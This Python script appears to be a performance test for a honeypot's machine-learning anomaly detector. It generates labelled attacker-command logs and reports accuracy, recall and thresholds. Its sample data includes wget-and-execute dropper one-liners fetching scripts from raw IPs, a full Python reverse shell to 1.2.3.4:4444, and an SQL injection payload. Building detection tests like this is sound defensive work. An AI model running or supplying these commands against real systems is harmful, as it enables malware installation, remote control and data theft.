#!/usr/bin/env python3
import sys
import os
import random
import string
import numpy as np
from pathlib import Path

# Add project root to path
sys.path.append(str(Path(__file__).resolve().parent.parent / "src"))

from cyanide.ml.cyanideML.model import HoneypotFilter

def random_str(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_known_attacks(n=500):
    """Real-world hacker commands found in Cowrie logs (Training Data baseline)."""
    logs = []
    attacks = [
        "yum install wget -y; apt install wget -y; dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh",
        "echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'",
        "cat /proc/mounts",
        "/bin/busybox PS",
        "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt; rm -rf *; wget http://123.123.123.123/bins.sh; chmod 777 bins.sh; ./bins.sh",
        "enable",
        "system"
    ]
    for _ in range(n):
        logs.append({
            "command": random.choice(attacks),
            "username": random.choice(["root", "admin", "guest"]),
            "dst_port": random.choice([22, 23, 2222]),
            "label": "known"
        })
    return logs

def generate_novel_anomalies(n=200):
    """Tricky or Novel attacks that should be detected as anomalous."""
    logs = []
    # Attack 1: Gibberish/Fuzzing
    for _ in range(int(n * 0.2)):
        logs.append({
            "command": "".join(random.choices(string.printable, k=100)),
            "username": "root", "dst_port": 22, "label": "anomaly"
        })
    # Attack 2: Complex Python Payload
    for _ in range(int(n * 0.3)):
        logs.append({
            "command": "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"1.2.3.4\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
            "username": "root", "dst_port": 22, "label": "anomaly"
        })
    # Attack 3: Novel SQLi
    for _ in range(int(n * 0.2)):
        logs.append({
            "command": "UNION SELECT NULL,NULL,NULL,CONCAT(0x7171787071,IFNULL(CAST(VERSION() AS CHAR),0x20),0x717a787a71)--",
            "username": "admin", "dst_port": 22, "label": "anomaly"
        })
    # Attack 4: Weird ports
    for _ in range(int(n * 0.3)):
        logs.append({
            "command": "id", "username": "root", "dst_port": 12345, "label": "anomaly"
        })
    return logs

def run_performance_test():
    model_path = "ai_models/cyanideML/cyanideML.pkl"
    if not os.path.exists(model_path):
        print(f"[!] Production model not found at {model_path}")
        return

    print(f"[*] Loading production model from {model_path}...")
    model = HoneypotFilter.load(model_path)
    model.online_learning = False # Disable learning during test
    
    if not model.is_fitted:
        print("[!] Model is NOT fitted. Performance will be zero (Cold Start).")
        return

    # Generate test set
    test_known = generate_known_attacks(n=500)
    test_anomalies = generate_novel_anomalies(n=200)
    test_set = test_known + test_anomalies
    random.shuffle(test_set)

    print(f"[*] Testing on {len(test_set)} logs ({len(test_known)} known, {len(test_anomalies)} novel)...")
    
    tp, tn, fp, fn = 0, 0, 0, 0
    known_errors = []
    anomaly_errors = []
    
    for log in test_set:
        is_val_anomaly = (log['label'] == 'anomaly')
        is_pred_anomaly, reason, dist = model.process_log(log)
        
        if is_val_anomaly:
            anomaly_errors.append(dist)
            if is_pred_anomaly: tp += 1
            else: fn += 1
        else:
            known_errors.append(dist)
            if is_pred_anomaly: fp += 1
            else: tn += 1

    accuracy = (tp + tn) / len(test_set)
    precision = tp / (tp + fp) if (tp + fp) > 0 else 0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0
    f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
    
    print("\n" + "="*40)
    print("      MODEL PERFORMANCE REPORT      ")
    print("="*40)
    print(f"Accuracy:  {accuracy*100:.2f}%")
    print(f"Recall:    {recall*100:.2f}% (Novel Attack Catch Rate)")
    print("-" * 40)
    print(f"Known Threat Error (Avg):  {np.mean(known_errors):.6f} (StdDev: {np.std(known_errors):.6f})")
    print(f"Novel Threat Error (Avg): {np.mean(anomaly_errors):.6f} (StdDev: {np.std(anomaly_errors):.6f})")
    print(f"Detection Threshold: {model.threshold:.6f}")
    print("-" * 40)
    
    # Suggest better threshold
    suggested = np.mean(known_errors) + (2 * np.std(known_errors))
    print(f"Suggested Threshold: {suggested:.6f} (Known Mean + 2-Sigma)")
    print("="*40)

if __name__ == "__main__":
    run_performance_test()
